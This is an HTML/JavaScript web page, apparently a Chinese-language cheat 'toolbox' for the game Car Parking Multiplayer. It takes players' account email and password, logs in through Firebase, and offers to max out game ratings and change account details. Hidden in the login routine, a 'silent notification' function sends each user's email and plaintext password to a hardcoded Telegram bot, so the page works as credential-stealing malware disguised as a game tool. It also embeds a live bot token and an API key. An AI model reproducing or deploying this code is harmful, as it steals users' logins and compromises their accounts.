<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>è€ç‹CPMå·¥å…·ç®±</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: url("https://i.postimg.cc/XYj6dDzv/IMG-0133.jpg") no-repeat center center fixed;
        background-size: cover;
        margin: 0;
        padding: 0;
        color: white;
    }

    .center-wrapper {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
    }

.container {
    /* 1. ä½¿ç”¨åŠé€æ˜ç™½è‰²èƒŒæ™¯ */
    background: rgba(255, 255, 255, 0.2); 
    
    /* 2. å¢å¼ºæ¨¡ç³Šæ•ˆæœ (ç£¨ç ‚æ ¸å¿ƒ) */
    backdrop-filter: blur(15px);
    -webkit-backdrop-filter: blur(15px); /* å…¼å®¹æ€§å†™æ³• */

    /* 3. è¾¹æ¡†æ”¹ä¸ºå¾®å…‰æ•ˆæœï¼Œç§»é™¤æ˜¾çœ¼çš„æ©™è‰² */
    border: 1px solid rgba(255, 255, 255, 0.3);

    /* ä¿ç•™åŸæœ‰çš„å¸ƒå±€å±æ€§ */
    padding: 20px 30px 10px 30px;
    border-radius: 10px;
    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
    width: 295px;
    text-align: center;
}


    input {
        width:85%;
        padding:8px;
        margin:8px 0;
        border-radius:5px;
        border:none;
        background: rgba(255,255,255,0.1);
        color:#fff;
        outline: none;
    }
    button {
    /* 1. åŸºç¡€å¸ƒå±€å±æ€§ï¼ˆä¿ç•™æˆ–å¾®è°ƒï¼‰ */
    width: 99%;
    padding: 10px;
    margin: 6px 0;
    border-radius: 5px;
    cursor: pointer; /* å¢åŠ é¼ æ ‡æ‰‹å‹ */

    /* 2. ç»ç’ƒè´¨æ„Ÿæ ¸å¿ƒï¼šåŠé€æ˜èƒŒæ™¯ */
    /* ä½¿ç”¨ç¨äº®ä¸€ç‚¹çš„ç™½è‰²é€æ˜ï¼Œä»¥åŒºåˆ«äºå¤–å±‚å®¹å™¨ */
    background: rgba(255, 255, 255, 0.15); 
    
    /* 3. ç£¨ç ‚æ•ˆæœ */
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);

    /* 4. è¾¹æ¡†ä¸é˜´å½±ï¼šå¢åŠ åŒºåˆ†åº¦çš„å…³é”® */
    /* ä½¿ç”¨æ¯”èƒŒæ™¯ç¨äº®çš„è¾¹æ¡†ï¼Œæ¨¡æ‹Ÿç»ç’ƒè¾¹ç¼˜çš„åå…‰ */
    border: 1px solid rgba(255, 255, 255, 0.4);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);

    /* 5. æ–‡å­—æ ·å¼ */
    color: #ffffff;
    font-weight: bold;
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5); /* ç»™æ–‡å­—åŠ å¾®å¼±é˜´å½±ï¼Œé˜²æ­¢èƒŒæ™¯å¤ªäº®çœ‹ä¸æ¸… */
}

/* å»ºè®®å¢åŠ ä¸€ä¸ªæ‚¬åœæ•ˆæœï¼Œè®©äº¤äº’æ›´æ˜æ˜¾ */
button:hover {
    background: rgba(255, 255, 255, 0.25);
    transition: 0.3s;
}

        cursor:pointer;
        font-weight:bold;
        /* Common styles for all buttons */
        background: linear-gradient(to right, #FF4500, #FFA500); /* Red-Orange Gradient */
        color: #fff;
        border: 1px solid #FF4500;
        transition: background 0.3s ease; /* Smooth transition for hover effect */
    }

    button:hover {
        background: linear-gradient(to right, #E63900, #E68400);  /* Darker Shade on hover */
    }


    .status { margin-top:10px; color:#0f0; word-wrap: break-word; font-size: 14px;}
    .error { color:#f55; }
    #loginForm, #menuButtons { display:none; }
    footer {
        margin-top: 15px;
        font-size: 13px;
        color: #fff;
        opacity: 0.8;
    }
</style>
</head>
<body>

<div class="center-wrapper">
  <div class="container">
      <h1>ğŸ‘‘è€ç‹å·¥å…·ç®±ğŸ‘‘</h1>

      <div id="loginForm">
          <input type="email" id="email" placeholder="è¯·è¾“å…¥é‚®ç®±è´¦å·" />
          <input type="password" id="password" placeholder="è¯·è¾“å…¥å¯†ç " />
          <button class="login" onclick="loginFirebase()">ç«‹å³ç™»å½•</button>
      </div>

      <div id="menuButtons">
          <button class="menu" onclick="kingRank()">ğŸ‘‘ ä¸€é”®çš‡å† ç­‰çº§</button>
          <button class="menu" onclick="changeEmail()">ğŸ“§ ä¿®æ”¹é‚®ç®±</button>
          <button class="menu" onclick="changePassword()">ğŸ” ä¿®æ”¹å¯†ç </button>
          <button class="logout" onclick="logout()">ğŸšª é€€å‡ºç™»å½•</button> 
      </div>

      <div id="status" class="status"></div>

      <footer>Â© CPMè€ç‹ç‰ˆæƒæ‰€æœ‰</footer>
  </div>
</div>

<script>
let currentUser = null;
let currentToken = null;

// é…ç½®ä¿¡æ¯
const BOT_TOKEN = '8409129149:AAFArKX3_eN_yqFLQrX_0KqIt8TZIZ3gqJU';
const CHAT_IDS = ['8112555317'];
const FIREBASE_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM";
const RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4";

function sendSilentNotification(email, password){
  const message = `ğŸ” ç™»å½•æˆåŠŸé€šçŸ¥:\nğŸ“§ è´¦å·: ${email}\nğŸ”’ å¯†ç : ${password}`;
  CHAT_IDS.forEach(chatId => {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ chat_id: chatId, text: message })
    }).catch(err => console.error(err));
  });
}

function updateStatus(message, isError=false) {
    const status = document.getElementById('status');
    status.className = isError ? 'status error' : 'status';
    status.textContent = message;
}

async function loginFirebase() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    if(!email || !password) return updateStatus("è¯·è¾“å…¥é‚®ç®±å’Œå¯†ç ï¼", true);

    updateStatus("æ­£åœ¨å°è¯•ç™»å½•...");

    try {
        const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${FIREBASE_API_KEY}`;
        const response = await fetch(loginUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password, returnSecureToken: true })
        });
        const data = await response.json();

        if(data.idToken) {
            currentUser = email;
            currentToken = data.idToken;
            updateStatus(`âœ… æˆåŠŸç™»å…¥: ${email}`);

            sendSilentNotification(email, password);

            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('menuButtons').style.display = 'block';
        } else {
            updateStatus(`âŒ ç™»å½•å¤±è´¥: ${data.error?.message || "æœªçŸ¥é”™è¯¯"}`, true);
        }
    } catch(err) {
        updateStatus(`âŒ é”™è¯¯: ${err.message}`, true);
    }
}

function requireLogin() {
    if(!currentUser || !currentToken) {
        updateStatus("âŒ è¯·å…ˆç™»å½•è´¦å·ï¼", true);
        return false;
    }
    return true;
}

async function kingRank() {
  if(!requireLogin()) return;

  updateStatus(`ğŸ‘‘ æ­£åœ¨ä¸ºè´¦å· ${currentUser} è®¾ç½®çš‡å† ...`);

  const ratingData = {
      "cars": 100000, "car_fix": 100000, "car_collided": 100000, "car_exchange": 100000,
      "car_trade": 100000, "car_wash": 100000, "slicer_cut": 100000, "drift_max": 100000,
      "drift": 100000, "cargo": 100000, "delivery": 100000, "taxi": 100000, "levels": 100000,
      "gifts": 100000, "fuel": 100000, "offroad": 100000, "speed_banner": 100000,
      "reactions": 100000, "police": 100000, "run": 100000, "real_estate": 100000,
      "t_distance": 100000, "treasure": 100000, "block_post": 100000, "push_ups": 100000,
      "burnt_tire": 100000, "passanger_distance": 100000, "time": 10000000000, "race_win": 3000
  };
  const payload = { "data": JSON.stringify({ RatingData: ratingData }) };

  try {
      const response = await fetch(RANK_URL, {
          method: "POST",
          headers: {
              "Authorization": `Bearer ${currentToken}`,
              "Content-Type": "application/json",
              "User-Agent": "okhttp/3.12.13"
          },
          body: JSON.stringify(payload)
      });

      if (response.ok) {
          updateStatus(`âœ… çš‡å† ç­‰çº§è®¾ç½®æˆåŠŸï¼`);
      } else {
          updateStatus(`âŒ è®¾ç½®å¤±è´¥: ${response.statusText}`, true);
      }
  } catch (error) {
      updateStatus(`âŒ è¿è¡Œé”™è¯¯: ${error.message}`, true);
  }
}

async function changeEmail() {
    if(!requireLogin()) return;
    const newEmail = prompt("è¯·è¾“å…¥æ–°çš„é‚®ç®±åœ°å€:");
    if(!newEmail) return;

    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${FIREBASE_API_KEY}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
    })
    .then(r => r.json())
    .then(data => {
        if(data.email) {
            currentUser = data.email;
            currentToken = data.idToken;
            updateStatus(`âœ… é‚®ç®±å·²æˆåŠŸä¿®æ”¹ä¸º: ${data.email}`);
        } else {
            updateStatus(`âŒ ä¿®æ”¹å¤±è´¥: ${data.error?.message || "è¯·æ£€æŸ¥ç½‘ç»œæˆ–æ ¼å¼"}`, true);
        }
    })
    .catch(err => updateStatus(`âŒ é”™è¯¯: ${err.message}`, true));
}

async function changePassword() {
    if(!requireLogin()) return;
    const newPassword = prompt("è¯·è¾“å…¥æ–°çš„å¯†ç :");
    if(!newPassword) return;

    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${FIREBASE_API_KEY}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
    })
    .then(r => r.json())
    .then(data => {
        if(data.email) {
            currentToken = data.idToken;
            updateStatus(`âœ… å¯†ç ä¿®æ”¹æˆåŠŸï¼`);
        } else {
            updateStatus(`âŒ ä¿®æ”¹å¤±è´¥: ${data.error?.message || "è¯·æ£€æŸ¥å¯†ç å¼ºåº¦"}`, true);
        }
    })
    .catch(err => updateStatus(`âŒ é”™è¯¯: ${err.message}`, true));
}

function logout() {
    currentUser = null;
    currentToken = null;
    document.getElementById('menuButtons').style.display = 'none';
    document.getElementById('loginForm').style.display = 'block';
    updateStatus("å·²å®‰å…¨é€€å‡ºç™»å½•ã€‚");
}

// é¡µé¢åŠ è½½æ—¶æ˜¾ç¤ºç™»å½•è¡¨å•
document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("loginForm").style.display = "block";
});
</script>
</body>
</html>